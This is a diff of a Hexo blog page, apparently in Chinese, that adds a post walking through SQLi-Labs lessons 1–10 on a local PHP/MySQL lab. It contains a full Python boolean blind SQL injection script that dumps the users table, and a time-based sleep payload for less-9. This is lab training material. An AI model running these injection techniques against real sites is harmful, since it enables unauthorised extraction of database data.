@@ -79,16 +79,27 @@
 
 
 
-<meta name="description" content="无我梦中">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="sqli-labs(less1-10)实验环境php5.5+apache+MySQL less-1 联合查询注入  输入单引号，页面报错，接着使用and &amp;#39;1&amp;#39;=&amp;#39;1和and &amp;#39;1&amp;#39;=&amp;#39;2 ,一个返回正常，一个报错，由报错结果可知，是字符型输入，大致语句应为select..from..where id=&amp;#39;$id&amp;#39;..     orde">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs(1-10)">
+<meta property="og:url" content="http://yoursite.com/2019/03/28/sqli-labs-1-10/index.html">
 <meta property="og:site_name" content="Blog">
-<meta property="og:description" content="无我梦中">
+<meta property="og:description" content="sqli-labs(less1-10)实验环境php5.5+apache+MySQL less-1 联合查询注入  输入单引号，页面报错，接着使用and &amp;#39;1&amp;#39;=&amp;#39;1和and &amp;#39;1&amp;#39;=&amp;#39;2 ,一个返回正常，一个报错，由报错结果可知，是字符型输入，大致语句应为select..from..where id=&amp;#39;$id&amp;#39;..     orde">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9cb2325c9ce.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9cb2ba602bd.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9cb31fcfd5d.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9cb349710c2.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9cb3b63ebc7.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9cb3b734981.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9cb3b7a7bc5.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9cb42dd36a1.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/28/5c9cb58d397e1.jpg">
+<meta property="og:updated_time" content="2019-03-28T12:23:14.054Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Blog">
-<meta name="twitter:description" content="无我梦中">
+<meta name="twitter:title" content="sqli-labs(1-10)">
+<meta name="twitter:description" content="sqli-labs(less1-10)实验环境php5.5+apache+MySQL less-1 联合查询注入  输入单引号，页面报错，接着使用and &amp;#39;1&amp;#39;=&amp;#39;1和and &amp;#39;1&amp;#39;=&amp;#39;2 ,一个返回正常，一个报错，由报错结果可知，是字符型输入，大致语句应为select..from..where id=&amp;#39;$id&amp;#39;..     orde">
+<meta name="twitter:image" content="https://i.loli.net/2019/03/28/5c9cb2325c9ce.png">
 
 
 
@@ -118,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/2019/03/28/sqli-labs-1-10/">
 
 
 
 
 
-  <title>Blog</title>
+  <title>sqli-labs(1-10) | Blog</title>
   
 
 
@@ -143,8 +154,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -257,9 +267,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -289,9 +299,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/28/sqli-labs-1-10/" itemprop="url">sqli-labs(1-10)</a></h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs(1-10)</h1>
         
 
         <div class="post-meta">
@@ -341,8 +349,7 @@
       
 
       
-        
-          <h1 id="sqli-labs-less1-10"><a href="#sqli-labs-less1-10" class="headerlink" title="sqli-labs(less1-10)"></a>sqli-labs(less1-10)</h1><p>实验环境php5.5+apache+MySQL</p>
+        <h1 id="sqli-labs-less1-10"><a href="#sqli-labs-less1-10" class="headerlink" title="sqli-labs(less1-10)"></a>sqli-labs(less1-10)</h1><p>实验环境php5.5+apache+MySQL</p>
 <h4 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h4><ul>
 <li><p>联合查询注入</p>
 <ol>
@@ -417,14 +424,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding=utf-8</span><br><span class="line">import urllib</span><br><span class="line"> </span><br><span class="line">url = &quot;http://localhost/sqli/Less-8/?id=1&quot;</span><br><span class="line">success_text = &quot;You are in...........&quot;</span><br><span class="line"> </span><br><span class="line">#定义相应的SQL注入语句</span><br><span class="line">ascii_fuzz = &quot;&apos; and ascii(substr((%s),%d,1))&gt;=%d #&quot;</span><br><span class="line">length_fuzz = &quot;&apos; and length(%s) &gt;= %d #&quot;</span><br><span class="line">DB_fuzz = &quot;select database()&quot;</span><br><span class="line">table_fuzz = &quot;select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1&quot;</span><br><span class="line">column_fuzz = &quot;select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %d,1&quot;</span><br><span class="line">data_fuzz = &quot;select %s from %s limit %d,1&quot;</span><br><span class="line"> </span><br><span class="line">tablecount_fuzz = &quot;&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)&gt;=%d #&quot;</span><br><span class="line">columncount_fuzz1 = &quot;&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;&quot;</span><br><span class="line">columncount_fuzz2 = &quot;&apos; and table_name=&apos;%s&apos;)&gt;=%d #&quot;</span><br><span class="line">datacount_fuzz = &quot;&apos; and (select count(*) from %s)&gt;=%d #&quot;</span><br><span class="line"> </span><br><span class="line">tablelength_fuzz1 = &quot;&apos;and (select length(table_name) from information_schema.tables where table_schema=&apos;%s&apos; limit &quot;</span><br><span class="line">tablelength_fuzz2 = &quot;,1)&gt;=%d #&quot;</span><br><span class="line">columnlength_fuzz1 = &quot;&apos; and (select length(column_name) from information_schema.columns where table_schema=&apos;&quot;</span><br><span class="line">columnlength_fuzz2 = &quot;&apos; and table_name=&apos;%s&apos; limit &quot;</span><br><span class="line">columnlength_fuzz3 = &quot;,1)&gt;=%d #&quot;</span><br><span class="line">datalength_fuzz1 = &quot;&apos; and (select length(&quot;</span><br><span class="line">datalength_fuzz2 = &quot;) from %s limit &quot;</span><br><span class="line">datalength_fuzz3 = &quot;,1)&gt;=%d #&quot;</span><br><span class="line"> </span><br><span class="line">#SQL盲注测试函数</span><br><span class="line">def Bind_SQL_Fuzz():</span><br><span class="line">    #获取数据库名的长度</span><br><span class="line">    DBnamelength = getLength(length_fuzz,&quot;database()&quot;)</span><br><span class="line">    DBname = getName(ascii_fuzz,DB_fuzz,DBnamelength)</span><br><span class="line">    print &quot;[*] The database is: &quot; + DBname</span><br><span class="line">    print</span><br><span class="line"> </span><br><span class="line">    #获取表的数量</span><br><span class="line">    tablecount = getLength(tablecount_fuzz,DBname)</span><br><span class="line">    print &quot;[*] The count of tables is: &quot; + str(tablecount)</span><br><span class="line"> </span><br><span class="line">    #获取各个表名</span><br><span class="line">    for i in xrange(0,tablecount):</span><br><span class="line">        tablelength_fuzz_new = tablelength_fuzz1 + str(i) + tablelength_fuzz2</span><br><span class="line">        tablelength = getLength(tablelength_fuzz_new,DBname)</span><br><span class="line">        tname = getName(ascii_fuzz,table_fuzz%(DBname,i),tablelength)</span><br><span class="line">        print &apos;[Table Name] &apos; + tname</span><br><span class="line">    print</span><br><span class="line"> </span><br><span class="line">    #获取users表的列数</span><br><span class="line">    columncount_fuzz_new = columncount_fuzz1 + DBname + columncount_fuzz2</span><br><span class="line">    columncount = getLength(columncount_fuzz_new,&quot;users&quot;)</span><br><span class="line">    print &quot;[*] (Table: users) The count of columns is: &quot; + str(columncount)</span><br><span class="line"> </span><br><span class="line">    #定义两个数组分别用于存储列名和列中对应的信息</span><br><span class="line">    col = []</span><br><span class="line">    Datas = []</span><br><span class="line"> </span><br><span class="line">    #获取数据一共有多少列</span><br><span class="line">    datacount = getLength(datacount_fuzz,&quot;users&quot;)</span><br><span class="line"> </span><br><span class="line">    #获取users表的列名</span><br><span class="line">    for i in xrange(0,columncount):</span><br><span class="line">        columnlength_fuzz_new = columnlength_fuzz1 + DBname + columnlength_fuzz2 + str(i) + columnlength_fuzz3</span><br><span class="line">        columnlength = getLength(columnlength_fuzz_new,&quot;users&quot;)</span><br><span class="line">        cname = getName(ascii_fuzz,column_fuzz%(DBname,&quot;users&quot;,i),columnlength)</span><br><span class="line">        print &quot;[Column Name] (Table: users) &quot; + cname</span><br><span class="line">        col.append(cname)</span><br><span class="line"> </span><br><span class="line">        #获取列名对应的数据信息</span><br><span class="line">        datas = []</span><br><span class="line">        for x in xrange(0,datacount):</span><br><span class="line">            datalength_fuzz_new = datalength_fuzz1 + cname + datalength_fuzz2 + str(x) + datalength_fuzz3</span><br><span class="line">            datalength = getLength(datalength_fuzz_new,&quot;users&quot;)</span><br><span class="line">            data = getName(ascii_fuzz,data_fuzz%(cname,&quot;users&quot;,x),datalength)</span><br><span class="line">            datas.append(data)</span><br><span class="line">        Datas.append(datas)</span><br><span class="line"> </span><br><span class="line">    print</span><br><span class="line"> </span><br><span class="line">    print &quot;[*] (Table: users) The count of data is: &quot; + str(datacount)</span><br><span class="line">    print</span><br><span class="line">    print &quot;[*] The data of users: &quot;</span><br><span class="line"> </span><br><span class="line">    #输出列名</span><br><span class="line">    colname = &quot;&quot;</span><br><span class="line">    for i in range(0,len(col)):</span><br><span class="line">        if i == 0:</span><br><span class="line">            colname += col[i]</span><br><span class="line">        else:</span><br><span class="line">            colname += &quot;    &quot; + col[i]</span><br><span class="line">    print colname</span><br><span class="line"> </span><br><span class="line">    #输出users表中的具体信息</span><br><span class="line">    show = &quot;&quot;</span><br><span class="line">    for i in xrange(0,datacount):</span><br><span class="line">        show = &quot;%-8s%-16s%-16s&quot;</span><br><span class="line">        print show%(Datas[0][i],Datas[1][i],Datas[2][i])</span><br><span class="line"> </span><br><span class="line">#获取字段的长度</span><br><span class="line">def getLength(text,string):</span><br><span class="line">    left = 0</span><br><span class="line">    right = 0</span><br><span class="line">    guess = 10</span><br><span class="line"> </span><br><span class="line">    while True:</span><br><span class="line">        #如果返回为真，那么guess加5直至返回为假时确定右边界</span><br><span class="line">        if Check1(text,string,guess) == True:</span><br><span class="line">            guess += 5</span><br><span class="line">        else:</span><br><span class="line">            right = guess</span><br><span class="line">            break</span><br><span class="line"> </span><br><span class="line">    #二分查找法</span><br><span class="line">    mid = (left + right) / 2</span><br><span class="line">    while left &lt; right - 1:</span><br><span class="line">        if  Check1(text,string,mid) == True:</span><br><span class="line">            left = mid</span><br><span class="line">        else:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) / 2</span><br><span class="line"> </span><br><span class="line">    return left</span><br><span class="line"> </span><br><span class="line">#检测请求SQL注入的URL是否注入成功</span><br><span class="line">def Check1(text,string,length):</span><br><span class="line"> </span><br><span class="line">    newurl = url + urllib.quote(text % (string,length))</span><br><span class="line">    result = urllib.urlopen(newurl)</span><br><span class="line"> </span><br><span class="line">    if success_text in result.read():</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line">#与check1类似，但接收的参数值数量不同</span><br><span class="line">def Check2(text,string,position,num):</span><br><span class="line"> </span><br><span class="line">    newurl = url + urllib.quote(text % (string,position,num))</span><br><span class="line">    result = urllib.urlopen(newurl)</span><br><span class="line"> </span><br><span class="line">    if success_text in result.read():</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line">#获取相应字段的名称</span><br><span class="line">def getName(text,string,length):</span><br><span class="line"> </span><br><span class="line">    name = &apos;&apos;</span><br><span class="line"> </span><br><span class="line">    for i in xrange(1,length+1):</span><br><span class="line"> </span><br><span class="line">        #32是空格，为第一个可显示的字符，127是delete，即最后一个可显示的字符</span><br><span class="line">        left = 32</span><br><span class="line">        right = 127</span><br><span class="line"> </span><br><span class="line">        #二分查找法</span><br><span class="line">        mid = (left + right) / 2</span><br><span class="line">        while left &lt; right - 1:</span><br><span class="line">            if Check2(text,string,i,mid) == True:</span><br><span class="line">                left = mid</span><br><span class="line">                mid = (left + right) / 2</span><br><span class="line">            else:</span><br><span class="line">                right = mid</span><br><span class="line">            mid = (left + right) / 2</span><br><span class="line">        name += chr(left)</span><br><span class="line"> </span><br><span class="line">    return name</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    Bind_SQL_Fuzz()</span><br><span class="line"> </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 <h4 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h4><p>基于时间的单引号字符盲注<br>尝试使用单引号和双引号闭合，发现页面回显一直正常。判断是时间注入。<br><code>id=1&#39; and if(ascii(substr((select database()),1,1))&gt;115,0,sleep(5)) --+</code></p>
 <h4 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h4><p>less-9换成双引号。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/03/28/sqli-labs-1-10/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+<a id="more"></a>
       
     </div>
     
@@ -441,12 +441,12 @@
       
 
       
+      
+      
 
       
 
       
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -456,10 +456,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -467,6 +468,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -487,8 +492,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -532,6 +546,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-less1-10"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs(less1-10)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#less-1"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">less-1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-2"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">less-2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-3"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-4"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">less-4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-6"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">less-6</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-7"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">less-7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-8"><span class="nav-number">1.0.0.7.</span> <span class="nav-text">less-8</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-9"><span class="nav-number">1.0.0.8.</span> <span class="nav-text">less-9</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-10"><span class="nav-number">1.0.0.9.</span> <span class="nav-text">less-10</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -672,6 +702,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
